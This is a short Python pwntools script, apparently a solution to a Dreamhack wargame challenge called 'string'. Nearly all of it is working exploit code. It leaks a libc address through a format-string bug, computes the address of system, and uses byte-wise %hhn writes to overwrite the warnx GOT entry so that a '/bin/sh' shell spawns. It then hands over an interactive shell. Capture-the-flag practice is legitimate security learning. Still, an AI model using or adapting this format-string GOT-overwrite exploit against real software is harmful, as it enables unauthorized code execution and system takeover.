from pwn import *

p = remote("host3.dreamhack.games", 14088)
#p = process("./string")
e = ELF("./string")
ld = ELF("./libc.so.6", checksec=False)

warnxGOTAddress = e.got["warnx"]

def send(n, text=""):
    p.sendlineafter(b"> ", str(n).encode())
    if(n == 1):
        p.sendline(text)

send(1, p32(e.got["printf"]) + b"LEAK:%5$s")

send(2)
p.recvuntil(b"LEAK:")

systemRealAddress = u32(p.recv(4)) - ld.sym["printf"] + ld.sym["system"]
print('SYSTEM: ',hex(systemRealAddress))
values = [
    [0, systemRealAddress & 0xff],
    [1, (systemRealAddress >> 8) & 0xff],
    [2, (systemRealAddress >> 16) & 0xff],
    [3, (systemRealAddress >> 24) & 0xff],
]
values = sorted(values, key=lambda x: x[1])

payload = b"/bin/sh;"+p32(warnxGOTAddress) + p32(warnxGOTAddress+1) + p32(warnxGOTAddress+2) + p32(warnxGOTAddress+3)
printed = len(payload)

for v in values:
    idx = v[0]
    h = v[1]
    payload += f"%{h-printed}c".encode()
    printed = h
    payload += f"%{7+idx}$hhn".encode()

print(payload)
send(1, payload)
send(2) ## overwrite
send(2) ## 실제 실행?

p.interactive()